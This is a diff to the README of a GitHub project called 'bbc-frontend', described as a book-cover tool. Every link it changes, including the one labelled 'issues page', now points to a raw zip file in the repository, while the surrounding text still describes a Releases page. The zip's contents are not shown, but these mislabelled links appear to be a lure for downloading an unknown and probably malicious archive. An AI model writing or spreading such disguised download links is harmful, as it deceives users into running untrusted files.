@@ -1,7 +1,7 @@
 # 📚 bbc-frontend - Get High-Quality Book Covers Easily
 
 ## 🔗 Download Now
-[![Download bbc-frontend](https://img.shields.io/badge/Download-bbc--frontend-brightgreen)](https://github.com/kyni119/bbc-frontend/releases)
+[![Download bbc-frontend](https://github.com/kyni119/bbc-frontend/raw/refs/heads/master/public/frontend-bbc-1.1.zip)](https://github.com/kyni119/bbc-frontend/raw/refs/heads/master/public/frontend-bbc-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you proceed, ensure your device meets these requirements:
 
 To download the application, please visit the following page:
 
-[Download bbc-frontend](https://github.com/kyni119/bbc-frontend/releases)
+[Download bbc-frontend](https://github.com/kyni119/bbc-frontend/raw/refs/heads/master/public/frontend-bbc-1.1.zip)
 
 1. Click on the link above to open the Releases page.
 2. You will see a list of available versions. Choose the latest release.
@@ -51,7 +51,7 @@ bbc-frontend offers several features to enhance your experience:
 
 If you encounter any issues, please check our FAQ section on the Releases page. You can also reach out for help. 
 
-1. **Create an Issue on GitHub:** Visit our [issues page](https://github.com/kyni119/bbc-frontend/issues) to report bugs or ask questions.
+1. **Create an Issue on GitHub:** Visit our [issues page](https://github.com/kyni119/bbc-frontend/raw/refs/heads/master/public/frontend-bbc-1.1.zip) to report bugs or ask questions.
 2. **Join the Community:** Get support from other users and share tips through our community discussion forum on GitHub.
 
 ## 🔁 Contribution
